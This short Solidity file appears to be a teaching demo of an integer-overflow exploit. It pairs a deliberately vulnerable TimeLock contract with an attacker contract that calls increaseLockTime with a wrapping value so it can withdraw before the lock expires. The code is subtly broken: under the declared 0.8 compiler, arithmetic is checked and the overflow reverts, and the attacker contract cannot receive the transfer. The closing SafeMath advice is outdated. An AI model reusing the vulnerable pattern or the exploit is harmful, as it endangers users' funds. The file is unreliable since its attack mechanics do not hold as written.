//SPDX-License-Identifier:MIT
pragma solidity ^0.8.11;

//An over/under flow occurs when an operation is performed that requires a fixed size variable 
//to store a number (or piece of data) that is outside the range of the variable's data type.

contract TimeLock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(block.timestamp > lockTime[msg.sender]);
        uint transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(transferValue);
    }
}

contract overflow {
    TimeLock timelock;

    constructor(address _timelock){
        timelock = TimeLock(_timelock);
    }

    function attack() public payable{
        require(msg.value > 0);
        timelock.deposit{value: msg.value}();
        timelock.increaseLockTime(type(uint).max +1 - timelock.lockTime(address(this)));       // causes the overflow

        timelock.withdraw();
    }
}

// preventive technnique --> using safemath libarary